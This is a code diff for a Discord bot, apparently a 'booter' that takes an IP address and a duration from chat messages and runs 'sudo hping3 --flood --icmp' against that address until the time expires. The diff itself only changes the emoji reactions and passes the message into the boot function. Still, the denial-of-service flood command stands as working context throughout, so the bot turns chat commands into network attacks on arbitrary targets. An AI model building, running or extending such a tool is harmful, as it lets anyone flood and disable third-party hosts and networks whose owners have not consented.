@@ -18,14 +18,15 @@ function parseMessage(msg) {
       return { ip, time }
     }
   }
+  msg.react('🚫')
   return undefined
 }
 
 client.on('message', (msg) => {
   const parsed = parseMessage(msg)
   if (parsed) {
-    msg.react('✅')
-    boot(parsed.ip, parsed.time)
+    msg.react('🕒')
+    boot(parsed.ip, parsed.time, msg)
   }
 })
 
@@ -37,17 +38,18 @@ client.on('ready', async () => {
     if (parsed) {
       const timeLeft = Date.now() - msg.createdTimestamp
       if (timeLeft < parsed.time * 1000) {
-        boot(parsed.ip, timeLeft / 1000)
+        boot(parsed.ip, timeLeft / 1000, msg)
       }
     }
   }
 })
 
-function boot(ip, time) {
+function boot(ip, time, msg) {
   console.log(`boot ${ip} ${time}`)
   const process = childProcess.spawn('sudo', ['hping3' ,'--flood', '--icmp', '--data', '55555', ip])
   setTimeout(() => { 
-    childProcess.exec(`kill -9 ${process.pid}`) 
+    childProcess.exec(`kill -9 ${process.pid}`)
+    msg.react('✅')
   }, time * 1000)
 }
 
